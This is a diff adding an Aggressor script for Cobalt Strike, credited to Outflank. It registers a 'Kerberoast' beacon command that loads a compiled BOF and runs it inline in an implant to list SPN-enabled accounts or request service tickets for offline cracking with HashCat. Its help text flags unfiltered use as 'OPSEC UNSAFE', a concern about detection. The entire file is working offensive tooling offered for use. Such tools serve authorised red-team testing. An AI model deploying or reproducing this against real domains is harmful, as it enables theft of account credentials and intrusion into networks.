@@ -1,0 +1,40 @@
+#Kerberoast-Bof
+#author Cornelis de Plaa
+#@outflank.nl
+
+#register help
+beacon_command_register("Kerberoast", "Perform Kerberoasting against all (or specified) SPN enabled accounts.",
+	"List all SPN enabled user/service accounts or request service tickets (TGS-REP) which can be cracked offline using HashCat.\n\n" .
+	"Synopsis: Kerberoast [list, list-no-aes, roast or roast-no-aes] [account <optional sAMAccountName filter (default all)>]\n\n" .
+	"WARNING: Listing and roasting tickets without sAMAccountName filter is OPSEC UNSAFE!\n\n");
+
+alias Kerberoast {
+	$bid = $1;
+
+	$input = substr($0, 11);
+	@args = split(' ', $input);
+
+	$action = @args[0];
+	$filter = @args[1];
+
+	if ($action eq "") {
+		berror($bid, "Please specify an action (list, list-no-aes, roast or roast-no-aes).");
+		return;
+	}
+
+	# Read in the right BOF file
+	$handle = openf(script_resource("Kerberoast." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	# Pack our arguments
+	if ($filter eq "") {
+		$arg_data  = bof_pack($bid, "Z", $action);
+	}
+	else {
+		$arg_data  = bof_pack($bid, "ZZ", $action, $filter);
+	}
+
+	blog($bid, "Kerberoast BOF by Outflank");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
